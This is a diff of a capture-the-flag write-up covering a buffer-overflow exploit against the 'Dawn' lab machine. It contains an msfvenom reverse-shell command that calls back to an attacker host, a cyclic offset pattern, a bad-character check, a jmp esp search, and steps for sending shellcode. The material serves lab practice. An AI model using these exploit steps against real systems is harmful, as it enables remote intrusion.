@@ -308,8 +308,8 @@ We are checking that every hex value from x00-FF is in order without any errors.
 The output shows us a viable pointer location at 0x345964ba.  We can point our BOF to end up at this address, containing a jmp instruction    
 ![jmpesp](https://user-images.githubusercontent.com/76034874/181870587-18478525-0d60-4cd5-9e6b-81ed35f016b5.png)
 
-# Generating the reverse shell
-We use msfvenom.  Our test target is windows and it is an x86 binary:
+## 7) Generating the reverse shell
+We use msfvenom.  Our test target is windows and it is an x86 binary.  Rule of thumb: match the payload to the OS of the target but the arch of the binary.
 msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode
 
 ```python
@@ -380,7 +380,7 @@ if __name__ == "__main__":
 ![revshell](https://user-images.githubusercontent.com/76034874/181870942-b910442c-0674-4e8b-8749-4a85c17f6adb.png)
 
 
-# Exploiting our Target
+## 8) Exploiting our Target
 ## with our poc script working in our test environment, it's time to exploit our real target, the Dawn machine:
 in the script, change the server to the target IP
 generate shellcode using msfvenom to match the arch and OS of the target, linux and x86:
@@ -431,7 +431,7 @@ if __name__ == "__main__":
 ![bling](https://user-images.githubusercontent.com/76034874/181871630-b621286e-9424-49de-b801-12e18335066f.png)
 
 
-## Part2 BOF
+# Part2 BOF
 ### We notice another .exe binary on the target in the 1st directory we land in.  Download it to our machine like before. We examine it to find it's the same type (32 bit x86 Little Endian Windows executable).
 
 ```bash
@@ -439,7 +439,7 @@ if __name__ == "__main__":
 └─# file dawn-BETA.exe                            
 dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows
 ```
-# Sending 500 As, same as before, this time to the other open port 1435:
+## 1) Sending 500 As, same as before, this time to the other open port 1435:
 
 ```python
 
@@ -451,7 +451,7 @@ payload = As + nullbyte
 ---snip---
 ```
 
-# Sending 500 Unique Characters
+## 2) Sending 500 Unique Characters
 
 ```python
 unique = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
@@ -470,17 +470,18 @@ using pattern_offset, we find the offset at 13:
 [*] Exact match at offset 13
 ```
 
-## Bad Char Test comes up clean
+## 3) Bad Char Test comes up clean
 
 ![badchar](https://user-images.githubusercontent.com/76034874/181870131-29d479b1-fb04-4e7d-a1ff-2dc5c950295c.png)
 
-## Finding the Jump Point
+## 4) Finding the Jump Point
 !mona jmp -r esp
 
 ![BETA_jmp](https://user-images.githubusercontent.com/76034874/182207148-7da1fca2-3c47-4eef-9670-89e715e53f27.png)
 
 
-## reuse linux revshell code from previous step
+## 5) Send reverse shell code
+We can reuse the linux revshell code from previous step, since it's already set up to point to our kali box.
 
 
 ```python
